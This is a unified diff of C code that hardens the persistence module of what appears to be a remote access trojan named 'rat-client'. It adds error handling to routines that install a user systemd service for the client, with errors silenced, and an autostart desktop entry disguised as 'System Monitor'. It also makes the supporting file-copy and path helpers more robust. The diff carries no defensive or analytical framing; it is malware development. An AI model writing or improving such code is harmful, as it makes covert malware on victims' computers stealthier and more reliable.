@@ -13,22 +13,42 @@ int install_systemd_service(const char *executable_path) {
     char *home_dir = get_home_directory();
     FILE *service_file;
     
+    if (!executable_path || strlen(executable_path) == 0) {
+        return -1;
+    }
+    
     if (!home_dir) {
         return -1;
     }
     
     // Create systemd user directory if it doesn't exist
-    snprintf(service_path, sizeof(service_path), "%s/.config/systemd/user", home_dir);
+    int ret = snprintf(service_path, sizeof(service_path), "%s/.config/systemd/user", home_dir);
+    if (ret >= (int)sizeof(service_path) || ret < 0) {
+        free(home_dir);
+        return -1;
+    }
+    
     if (mkdir(service_path, 0755) != 0 && errno != EEXIST) {
         free(home_dir);
         return -1;
     }
     
     // Create service file path
-    snprintf(service_path, sizeof(service_path), "%s/.config/systemd/user/rat-client.service", home_dir);
+    ret = snprintf(service_path, sizeof(service_path), "%s/.config/systemd/user/rat-client.service", home_dir);
+    if (ret >= (int)sizeof(service_path) || ret < 0) {
+        free(home_dir);
+        return -1;
+    }
+    
+    // Get username safely
+    const char *username = getlogin();
+    if (!username) {
+        struct passwd *pw = getpwuid(getuid());
+        username = pw ? pw->pw_name : "unknown";
+    }
     
     // Create service file content
-    snprintf(service_content, sizeof(service_content),
+    ret = snprintf(service_content, sizeof(service_content),
         "[Unit]\n"
         "Description=RAT Client Service\n"
         "After=network.target\n"
@@ -42,7 +62,12 @@ int install_systemd_service(const char *executable_path) {
         "\n"
         "[Install]\n"
         "WantedBy=default.target\n",
-        executable_path, getlogin());
+        executable_path, username);
+    
+    if (ret >= (int)sizeof(service_content) || ret < 0) {
+        free(home_dir);
+        return -1;
+    }
     
     // Write service file
     service_file = fopen(service_path, "w");
@@ -51,16 +76,32 @@ int install_systemd_service(const char *executable_path) {
         return -1;
     }
     
-    fprintf(service_file, "%s", service_content);
-    fclose(service_file);
+    size_t content_len = strlen(service_content);
+    size_t written = fwrite(service_content, 1, content_len, service_file);
+    int close_result = fclose(service_file);
+    
+    if (written != content_len || close_result != 0) {
+        unlink(service_path); // Remove partially written file
+        free(home_dir);
+        return -1;
+    }
     
     // Enable and start the service
     char command[1024];
-    snprintf(command, sizeof(command), "systemctl --user daemon-reload && systemctl --user enable rat-client.service && systemctl --user start rat-client.service");
-    system(command);
+    ret = snprintf(command, sizeof(command), 
+        "systemctl --user daemon-reload 2>/dev/null && "
+        "systemctl --user enable rat-client.service 2>/dev/null && "
+        "systemctl --user start rat-client.service 2>/dev/null");
+    
+    if (ret >= (int)sizeof(command) || ret < 0) {
+        free(home_dir);
+        return -1;
+    }
+    
+    int system_result = system(command);
     
     free(home_dir);
-    return 0;
+    return (system_result == 0) ? 0 : -1;
 #endif
 }
 
@@ -111,22 +152,35 @@ int install_autostart_entry(const char *executable_path) {
     char *home_dir = get_home_directory();
     FILE *desktop_file;
     
+    if (!executable_path || strlen(executable_path) == 0) {
+        return -1;
+    }
+    
     if (!home_dir) {
         return -1;
     }
     
     // Create autostart directory if it doesn't exist
-    snprintf(autostart_path, sizeof(autostart_path), "%s/.config/autostart", home_dir);
+    int ret = snprintf(autostart_path, sizeof(autostart_path), "%s/.config/autostart", home_dir);
+    if (ret >= (int)sizeof(autostart_path) || ret < 0) {
+        free(home_dir);
+        return -1;
+    }
+    
     if (mkdir(autostart_path, 0755) != 0 && errno != EEXIST) {
         free(home_dir);
         return -1;
     }
     
     // Create desktop file path
-    snprintf(autostart_path, sizeof(autostart_path), "%s/.config/autostart/rat-client.desktop", home_dir);
+    ret = snprintf(autostart_path, sizeof(autostart_path), "%s/.config/autostart/rat-client.desktop", home_dir);
+    if (ret >= (int)sizeof(autostart_path) || ret < 0) {
+        free(home_dir);
+        return -1;
+    }
     
     // Create desktop file content
-    snprintf(autostart_content, sizeof(autostart_content),
+    ret = snprintf(autostart_content, sizeof(autostart_content),
         "[Desktop Entry]\n"
         "Type=Application\n"
         "Name=System Monitor\n"
@@ -137,6 +191,11 @@ int install_autostart_entry(const char *executable_path) {
         "X-GNOME-Autostart-enabled=true\n",
         executable_path);
     
+    if (ret >= (int)sizeof(autostart_content) || ret < 0) {
+        free(home_dir);
+        return -1;
+    }
+    
     // Write desktop file
     desktop_file = fopen(autostart_path, "w");
     if (!desktop_file) {
@@ -144,11 +203,22 @@ int install_autostart_entry(const char *executable_path) {
         return -1;
     }
     
-    fprintf(desktop_file, "%s", autostart_content);
-    fclose(desktop_file);
+    size_t content_len = strlen(autostart_content);
+    size_t written = fwrite(autostart_content, 1, content_len, desktop_file);
+    int close_result = fclose(desktop_file);
+    
+    if (written != content_len || close_result != 0) {
+        unlink(autostart_path); // Remove partially written file
+        free(home_dir);
+        return -1;
+    }
     
     // Make it executable
-    chmod(autostart_path, 0755);
+    if (chmod(autostart_path, 0755) != 0) {
+        unlink(autostart_path); // Remove file if chmod failed
+        free(home_dir);
+        return -1;
+    }
     
     free(home_dir);
     return 0;
@@ -417,8 +487,18 @@ int copy_file(const char *src, const char *dest) {
     char buffer[4096];
     size_t bytes;
     
+    if (!src || !dest) {
+        return -1;
+    }
+    
+    if (strlen(src) == 0 || strlen(dest) == 0) {
+        return -1;
+    }
+    
     source = fopen(src, "rb");
-    if (!source) return -1;
+    if (!source) {
+        return -1;
+    }
     
     destination = fopen(dest, "wb");
     if (!destination) {
@@ -427,15 +507,31 @@ int copy_file(const char *src, const char *dest) {
     }
     
     while ((bytes = fread(buffer, 1, sizeof(buffer), source)) > 0) {
-        if (fwrite(buffer, 1, bytes, destination) != bytes) {
+        size_t written = fwrite(buffer, 1, bytes, destination);
+        if (written != bytes) {
             fclose(source);
             fclose(destination);
+            unlink(dest); // Remove partially written file
             return -1;
         }
     }
     
-    fclose(source);
-    fclose(destination);
+    // Check for read errors
+    if (ferror(source)) {
+        fclose(source);
+        fclose(destination);
+        unlink(dest); // Remove partially written file
+        return -1;
+    }
+    
+    int close_src = fclose(source);
+    int close_dest = fclose(destination);
+    
+    if (close_src != 0 || close_dest != 0) {
+        unlink(dest); // Remove file if close failed
+        return -1;
+    }
+    
     return 0;
 }
 
@@ -447,21 +543,30 @@ int file_exists(const char *path) {
 char* get_executable_path(void) {
 #ifdef _WIN32
     char *path = malloc(MAX_PATH);
-    if (path && GetModuleFileName(NULL, path, MAX_PATH) > 0) {
+    if (!path) {
+        return NULL;
+    }
+    
+    DWORD result = GetModuleFileName(NULL, path, MAX_PATH);
+    if (result > 0 && result < MAX_PATH) {
         return path;
     }
-    if (path) free(path);
+    
+    free(path);
     return NULL;
 #else
     char *path = malloc(PATH_MAX);
-    if (path) {
-        ssize_t len = readlink("/proc/self/exe", path, PATH_MAX - 1);
-        if (len > 0) {
-            path[len] = '\0';
-            return path;
-        }
+    if (!path) {
+        return NULL;
     }
-    if (path) free(path);
+    
+    ssize_t len = readlink("/proc/self/exe", path, PATH_MAX - 1);
+    if (len > 0 && len < PATH_MAX - 1) {
+        path[len] = '\0';
+        return path;
+    }
+    
+    free(path);
     return NULL;
 #endif
 }
@@ -469,15 +574,22 @@ char* get_executable_path(void) {
 char* get_home_directory(void) {
 #ifdef _WIN32
     char *home = malloc(MAX_PATH);
-    if (home && SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, SHGFP_TYPE_CURRENT, home) == S_OK) {
+    if (!home) {
+        return NULL;
+    }
+    
+    HRESULT result = SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, SHGFP_TYPE_CURRENT, home);
+    if (result == S_OK) {
         return home;
     }
+    
     free(home);
     return NULL;
 #else
     struct passwd *pw = getpwuid(getuid());
     if (pw && pw->pw_dir) {
-        char *home = malloc(strlen(pw->pw_dir) + 1);
+        size_t len = strlen(pw->pw_dir);
+        char *home = malloc(len + 1);
         if (home) {
             strcpy(home, pw->pw_dir);
             return home;
